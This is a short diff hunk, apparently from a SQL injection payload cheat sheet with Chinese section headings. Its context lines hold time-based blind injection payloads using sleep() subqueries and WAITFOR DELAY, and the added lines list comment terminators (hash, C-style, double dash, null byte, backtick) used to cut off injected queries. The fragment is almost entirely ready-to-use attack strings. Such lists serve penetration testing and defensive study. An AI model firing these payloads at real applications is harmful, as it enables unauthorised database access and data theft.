@@ -88,6 +88,14 @@ Time-Based:
 ,(select * from (select(sleep(10)))a)
 %2c(select%20*%20from%20(select(sleep(10)))a)
 ';WAITFOR DELAY '0:0:30'--
+
+Comments:
+
+\#      Hash comment
+/*    C-style comment
+-- -  SQL comment
+;%00  Nullbyte
+`      Backtick
 ```
 ## 基于通用错误的有效负载
 ```
